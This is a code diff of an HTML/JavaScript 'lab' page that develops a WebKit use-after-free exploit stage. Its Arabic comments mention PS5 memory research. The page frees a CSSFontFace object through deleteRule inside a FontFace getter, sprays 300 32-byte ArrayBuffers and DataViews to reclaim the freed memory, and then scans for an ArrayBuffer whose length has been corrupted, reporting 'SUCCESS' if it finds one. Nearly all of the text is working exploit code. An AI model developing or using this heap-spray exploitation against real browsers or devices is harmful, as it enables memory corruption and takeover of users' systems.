@@ -7,7 +7,7 @@
 </head>
 <body>
     <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
-        [LAB] WebKit Structure Alignment Laboratory...
+        [LAB] WebKit Corruption & Corrupted Length Test...
     </div>
 
 <script>
@@ -16,11 +16,11 @@ function updateStatus(message) {
     if (panel) panel.innerHTML += "<br>[*] " + message;
 }
 
-// تخصيص مصفوفات ذات أحجام بايت محددة لمحاكاة بنية الـ C++ المحررة
-let structureHolders = [];
+let structuralArrays = [];
+let views = [];
 
 window.onload = () => {
-    updateStatus("Initializing precise layout memory allocation...");
+    updateStatus("Stage 3: Attempting Memory Structure Overlap...");
 
     let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -33,22 +33,21 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
-                updateStatus("Triggering deleteRule(0) to free CSSFontFace...");
-
-                // 1. تحرير الكائن الأصلي
+                
+                // 1. التحرير الفوري لكائن الـ C++
                 document.getElementById('s').sheet.deleteRule(0);
 
-                updateStatus("Attempting precise structure replacement (Heap Alignment)...");
+                updateStatus("Corrupting: Spraying interleaved ArrayBuffers and Views...");
                 
-                // 2. محاولة ملء الفراغ بأحجام بايت محددة (تتراوح بين 16 إلى 64 بايت)
-                // الباحثون يستخدمون هذه الأنماط لتثبيت مؤشرات الذاكرة في الـ PS5
-                for (let i = 0; i < 200; i++) {
-                    // ننشئ ArrayBuffer صغير جداً يتطابق مع حجم بنية الكائن المحرر في الـ Heap
-                    let buffer = new ArrayBuffer(32); 
-                    structureHolders.push(buffer);
+                // 2. تكتيك التداخل: ننشئ مصفوفات متتالية في الذاكرة لعل أحدها يقع مكان الكائن المحذوف
+                for (let i = 0; i < 300; i++) {
+                    // حجم 32 بايت يحاكي الحجم التقريبي للبنية الداخلية
+                    let buffer = new ArrayBuffer(32);
+                    structuralArrays.push(buffer);
+                    views.push(new DataView(buffer));
                 }
 
-                updateStatus("Verifying if WebKit layout survives code re-entry...");
+                updateStatus("Triggering Layout verification step...");
                 document.body.offsetTop; 
             }
             return undefined;
@@ -57,8 +56,23 @@ window.onload = () => {
 
     document.fonts.load('1em targetFont', 'AB');
 
+    // خطوة الفحص بعد التعديل الذاكري
     setTimeout(() => {
-        updateStatus("Testing sequence concluded. Evaluate stability state.");
+        updateStatus("Verification Phase: Checking if any ArrayBuffer length was corrupted...");
+        
+        let corrupted = false;
+        for (let i = 0; i < structuralArrays.length; i++) {
+            // القيمة الطبيعية يجب أن تكون 32. إذا تغيرت، فقد نجح التداخل!
+            if (structuralArrays[i].byteLength !== 32) {
+                updateStatus("SUCCESS: Found corrupted ArrayBuffer at index " + i + " with size: " + structuralArrays[i].byteLength);
+                corrupted = true;
+                break;
+            }
+        }
+        
+        if (!corrupted) {
+            updateStatus("Buffers intact. Standard layout maintained (or memory isolated).");
+        }
     }, 600);
 };
 </script>
